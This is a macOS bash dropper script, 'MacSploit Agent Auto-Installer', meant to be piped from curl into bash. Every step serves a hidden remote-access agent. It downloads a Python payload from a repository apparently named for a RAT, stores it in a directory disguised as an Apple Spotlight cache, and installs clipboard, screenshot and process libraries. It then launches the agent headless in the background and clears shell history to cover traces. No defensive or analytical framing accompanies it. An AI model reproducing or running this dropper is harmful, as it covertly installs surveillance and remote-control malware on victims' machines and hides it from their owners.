#!/bin/bash
# MacSploit Agent Auto-Installer for macOS
# Run: curl -fsSL https://raw.githubusercontent.com/GhostStrots/flipprat/install.sh | bash

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${GREEN}🚀 MacSploit Agent Installer${NC}"
echo "=============================="

# Config
PAYLOAD_URL="https://raw.githubusercontent.com/GhostStrots/flipprat/main/main.py"
HIDE_DIR="$HOME/Library/Caches/com.apple.SpotlightIndex$(openssl rand -hex 2 | tr '[:lower:]' '[:upper:]')"
AGENT_PATH="$HIDE_DIR/agent.py"

# 1. Check macOS
if [[ "$(uname)" != "Darwin" ]]; then
    echo -e "${RED}❌ This installer is for macOS only${NC}"
    exit 1
fi

# 2. Check for Python3
echo -e "${YELLOW}⏳ Checking Python3...${NC}"
if command -v python3 &> /dev/null; then
    PYTHON_VERSION=$(python3 --version 2>&1)
    echo -e "${GREEN}✅ Found: $PYTHON_VERSION${NC}"
else
    echo -e "${YELLOW}⚠️  Python3 not found. Installing...${NC}"
    
    if ! command -v brew &> /dev/null; then
        echo -e "${YELLOW}📦 Installing Homebrew...${NC}"
        /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
    fi
    
    echo -e "${YELLOW}📦 Installing Python3...${NC}"
    brew install python3
    
    if ! command -v python3 &> /dev/null; then
        echo -e "${RED}❌ Failed to install Python3${NC}"
        exit 1
    fi
    echo -e "${GREEN}✅ Python3 installed${NC}"
fi

# 3. Check for pip
echo -e "${YELLOW}⏳ Checking pip...${NC}"
if ! python3 -m pip --version &> /dev/null; then
    echo -e "${YELLOW}📦 Installing pip...${NC}"
    curl -fsSL https://bootstrap.pypa.io/get-pip.py -o /tmp/get-pip.py
    python3 /tmp/get-pip.py --user
    rm -f /tmp/get-pip.py
fi
echo -e "${GREEN}✅ pip ready${NC}"

# 4. Install dependencies
echo -e "${YELLOW}⏳ Installing dependencies...${NC}"
python3 -m pip install --user requests psutil Pillow pyperclip 2>&1 | tail -5
echo -e "${GREEN}✅ Dependencies installed${NC}"

# 5. Create hidden directory
echo -e "${YELLOW}⏳ Setting up agent...${NC}"
mkdir -p "$HIDE_DIR"
cd "$HIDE_DIR"

# 6. Download payload
echo -e "${YELLOW}⏳ Downloading agent...${NC}"
curl -fsSL "$PAYLOAD_URL" -o agent.py

if [ ! -f agent.py ] || [ ! -s agent.py ]; then
    echo -e "${RED}❌ Failed to download agent (file missing or empty)${NC}"
    exit 1
fi

echo -e "${GREEN}✅ Agent downloaded ($(wc -c < agent.py) bytes)${NC}"

# 7. Launch agent headless
echo -e "${YELLOW}🚀 Starting agent...${NC}"
nohup python3 "$AGENT_PATH" > /dev/null 2>&1 &
AGENT_PID=$!

sleep 3

# 8. Verify it's running (check PID exists, not pgrep)
if kill -0 $AGENT_PID 2>/dev/null; then
    echo -e "${GREEN}✅ Agent running (PID: $AGENT_PID)${NC}"
else
    echo -e "${RED}⚠️  Agent failed to start. Trying direct run...${NC}"
    python3 "$AGENT_PATH" &
fi

# 9. Clean up
history -c 2>/dev/null || true

echo -e "${GREEN}🎉 Done! Agent is live.${NC}"
echo -e "${YELLOW}💡 To stop: killall python3${NC}"
echo -e "${YELLOW}💡 To uninstall: rm -rf $HIDE_DIR${NC}"
